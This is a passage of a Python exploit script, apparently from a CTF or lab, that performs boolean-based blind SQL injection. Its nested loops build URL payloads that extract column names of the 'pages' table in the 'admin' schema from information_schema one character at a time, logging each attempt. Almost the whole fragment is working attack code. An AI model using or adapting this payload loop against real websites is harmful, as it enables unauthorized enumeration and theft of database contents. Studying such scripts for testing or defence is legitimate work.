    ...
    for dbs in range(0, 6):
        ...
        for position_character in range(1, 30):
            ...
            for character in chars:
                sqli = url + f"'+AND+(SELECT+substring(column_name,{position_character},1)+FROM+information_schema.columns+WHERE+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)%3d'{character}-- "
                p1.status(sqli)
